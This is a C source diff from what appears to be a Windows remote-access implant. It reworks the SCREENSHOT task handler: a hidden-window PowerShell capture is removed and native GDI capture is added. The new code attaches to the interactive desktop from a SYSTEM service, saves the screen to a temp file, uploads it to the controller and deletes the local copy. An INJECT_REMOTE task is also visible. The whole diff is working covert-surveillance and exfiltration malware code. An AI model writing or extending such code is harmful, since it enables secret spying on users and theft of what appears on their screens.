@@ -694,37 +694,88 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id, msg, "");
     }
     else if (strcmp(type_upper, "SCREENSHOT") == 0) {
-        /* Use virtual-screen bounds so it works on headless/server Windows too */
-        const char *sc_path = "C:\\Windows\\Temp\\_sc.png";
-        char *out = run_shell("powershell.exe -NoP -NonI -W Hidden -C \""
-            "Add-Type -Assembly System.Windows.Forms,System.Drawing;"
-            "try {"
-            "$w=[Windows.Forms.SystemInformation]::VirtualScreen.Width;"
-            "$h=[Windows.Forms.SystemInformation]::VirtualScreen.Height;"
-            "if($w -le 0){$w=1920};if($h -le 0){$h=1080};"
-            "$b=[Drawing.Bitmap]::new($w,$h);"
-            "$g=[Drawing.Graphics]::FromImage($b);"
-            "$g.CopyFromScreen(0,0,0,0,[Drawing.Size]::new($w,$h));"
-            "$p='C:\\\\Windows\\\\Temp\\\\_sc.png';"
-            "$b.Save($p,[Drawing.Imaging.ImageFormat]::Png);"
-            "$g.Dispose();$b.Dispose();"
-            "Write-Output OK"
-            "} catch { Write-Output ERR }\"");
-        int ps_ok = out && strncmp(out, "OK", 2) == 0;
-        if (out) free(out);
-        if (ps_ok) {
-            HANDLE hf = CreateFileA(sc_path, GENERIC_READ, FILE_SHARE_READ, NULL,
+        /* Native GDI capture with WinSta0/Default desktop access so it works
+         * from session 0 (SYSTEM service) when an interactive session exists.
+         * Output is a BMP file (GUI accepts .bmp). */
+        const char *sc_path = "C:\\Windows\\Temp\\_sc.bmp";
+
+        HWINSTA hOrigSta = GetProcessWindowStation();
+        HWINSTA hSta = OpenWindowStationA("WinSta0", FALSE,
+            WINSTA_ALL_ACCESS | READ_CONTROL);
+        if (hSta) SetProcessWindowStation(hSta);
+
+        HDESK hOrigDesk = GetThreadDesktop(GetCurrentThreadId());
+        /* DESKTOP_ALL_ACCESS not defined in older MinGW — use explicit mask */
+        DWORD desk_access = DESKTOP_READOBJECTS|DESKTOP_CREATEWINDOW|DESKTOP_CREATEMENU|
+                            DESKTOP_HOOKCONTROL|DESKTOP_JOURNALRECORD|DESKTOP_JOURNALPLAYBACK|
+                            DESKTOP_ENUMERATE|DESKTOP_WRITEOBJECTS|DESKTOP_SWITCHDESKTOP|READ_CONTROL;
+        HDESK hDesk = OpenDesktopA("Default", 0, FALSE, desk_access);
+        if (hDesk) SetThreadDesktop(hDesk);
+
+        HDC hDC   = GetDC(NULL);
+        int sw    = GetSystemMetrics(SM_CXSCREEN);
+        int sh    = GetSystemMetrics(SM_CYSCREEN);
+
+        int ok_flag = 0;
+        if (hDC && sw > 0 && sh > 0) {
+            HDC hMemDC = CreateCompatibleDC(hDC);
+            HBITMAP hBmp = CreateCompatibleBitmap(hDC, sw, sh);
+            HGDIOBJ hOld = SelectObject(hMemDC, hBmp);
+            BitBlt(hMemDC, 0, 0, sw, sh, hDC, 0, 0, SRCCOPY | CAPTUREBLT);
+            SelectObject(hMemDC, hOld);
+
+            BITMAPINFOHEADER bi = {0};
+            bi.biSize        = sizeof(bi);
+            bi.biWidth       = sw;
+            bi.biHeight      = -sh; /* top-down */
+            bi.biPlanes      = 1;
+            bi.biBitCount    = 24;
+            bi.biCompression = BI_RGB;
+            int row_sz = (sw * 3 + 3) & ~3;
+            DWORD data_sz = (DWORD)((size_t)row_sz * (size_t)sh);
+            uint8_t *pixels = (uint8_t*)malloc(data_sz);
+            if (pixels) {
+                GetDIBits(hMemDC, hBmp, 0, (UINT)sh,
+                    pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+
+                BITMAPFILEHEADER bfh = {0};
+                bfh.bfType   = 0x4D42;
+                bfh.bfSize   = (DWORD)(sizeof(bfh) + sizeof(bi) + data_sz);
+                bfh.bfOffBits= (DWORD)(sizeof(bfh) + sizeof(bi));
+
+                HANDLE hF = CreateFileA(sc_path, GENERIC_WRITE, 0, NULL,
+                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                if (hF != INVALID_HANDLE_VALUE) {
+                    DWORD wr;
+                    WriteFile(hF, &bfh, sizeof(bfh), &wr, NULL);
+                    WriteFile(hF, &bi, sizeof(bi), &wr, NULL);
+                    WriteFile(hF, pixels, data_sz, &wr, NULL);
+                    CloseHandle(hF);
+                    ok_flag = 1;
+                }
+                free(pixels);
+            }
+            DeleteDC(hMemDC);
+            DeleteObject(hBmp);
+            ReleaseDC(NULL, hDC);
+        }
+
+        if (hDesk) { SetThreadDesktop(hOrigDesk); CloseDesktop(hDesk); }
+        if (hSta)  { SetProcessWindowStation(hOrigSta); CloseWindowStation(hSta); }
+
+        if (ok_flag) {
+            HANDLE hF = CreateFileA(sc_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-            if (hf != INVALID_HANDLE_VALUE) {
-                DWORD fsz = GetFileSize(hf, NULL);
+            if (hF != INVALID_HANDLE_VALUE) {
+                DWORD fsz = GetFileSize(hF, NULL);
                 uint8_t *data = (uint8_t*)malloc(fsz);
-                DWORD rd = 0; ReadFile(hf, data, fsz, &rd, NULL); CloseHandle(hf);
-                agent_upload_file(task->id, "screenshot.png", data, rd);
+                DWORD rd = 0; ReadFile(hF, data, fsz, &rd, NULL); CloseHandle(hF);
+                agent_upload_file(task->id, "screenshot.bmp", data, rd);
                 free(data); DeleteFileA(sc_path);
                 char m[64]; snprintf(m, 64, "[+] screenshot (%lu bytes)", rd);
                 agent_send_result(task->id, m, "");
-            } else agent_send_result(task->id, "", "screenshot: file open failed");
-        } else agent_send_result(task->id, "", "screenshot: capture failed (headless?)");
+            } else agent_send_result(task->id, "", "screenshot: read failed");
+        } else agent_send_result(task->id, "", "screenshot: GDI capture failed");
     }
     else if (strcmp(type_upper, "INJECT_REMOTE") == 0) {
         if (!task->payload || task->payload_len == 0) {
